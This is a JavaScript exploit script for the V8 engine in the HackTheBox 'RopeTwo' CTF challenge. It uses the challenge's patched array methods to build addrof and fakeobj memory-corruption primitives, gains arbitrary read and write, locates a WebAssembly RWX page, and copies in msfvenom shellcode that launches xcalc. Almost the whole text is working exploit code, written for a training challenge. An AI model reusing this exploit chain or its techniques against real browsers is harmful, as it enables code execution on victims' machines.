// exploit created on : 21/01/2021
// exploit created by : 0xAnnLynn
// exploit for vulnerable chrome browser on hackthebox ropetwo machine which is a v8 pwn challenge 
// sandbox not implemented so we are not going to escape sandbox if sandbox enabled this exploit won't work

var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

// https://wasdk.github.io/WasmFiddle/
// spraying wasm code on buffer to make a read write execute page memory for our shellcode 
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var shell = wasm_instance.exports.main;

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
    }

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function ftoh(val) {
    return "0x" + ftoi(val).toString(16)
}

// addrof primitive
var temp_obj = {"A":1};
var obj_arr = [temp_obj];
var fl_arr = [1.1, 1.2, 1.3, 1.4];
var fl_map = fl_arr.GetLastElement();
var obj_map = itof(ftoi(fl_map) + 0x50n);

console.log("[*] Float  Map: " + ftoh(fl_map));
console.log("[*] Object Map: " + ftoh(obj_map));

function addrof(leak) {
	arr = [ 1.1 ];
	arr.SetLastElement(obj_map);
	arr[0] = leak;
	arr.SetLastElement(fl_map);
	let addr = arr[0];
	arr.SetLastElement(obj_map);
	
	// For pointer compression adding isolate root 
	return ftoi(addr) & 0xffffffffn;
}

// fakeobj primitive 
function fakeobj(addr) {
	arr = [1.1]
	arr[0] = itof(addr)
	arr.SetLastElement(obj_map)
	let fake = arr[0];
	arr.SetLastElement(fl_map);
	return fake;
}

var fake_arr = [ fl_map, 1.1, 1.2, 1.3 ]
var fake = fakeobj(addrof(fake_arr) - 0x20n);

function read(addr) {
	if (addr % 2n == 0) {
		addr += 1;
	}
	fake_arr[1] = itof((8n << 32n) + addr -8n);
	return fake[0];
}

function write(addr, val) {
        if (addr % 2n == 0) {
                addr += 1;
        }
        fake_arr[1] = itof((8n << 32n) + addr -8n);
        fake[0] = itof(BigInt(val));

}

console.log("[+] Found WASM_Instance at 0x" + addrof(wasm_instance).toString(16));
var rwx_page_addr = ftoi(read(addrof(wasm_instance) + 0x68n));
console.log("[+] Found rwx_page at 0x" + addrof(rwx_page_addr).toString(16));

// shellcode function
function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x14n;
    write(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4*i, shellcode[i], true);
    }
}
console.log("[+] Copying xcalc shellcode to RWX page");
// msfvenom -p linux/x64/exec CMD='/usr/bin/xcalc' --format dword
var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e, 0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
copy_shellcode(rwx_page_addr, shellcode);
console.log("[+] Popping calc :)");
shell();
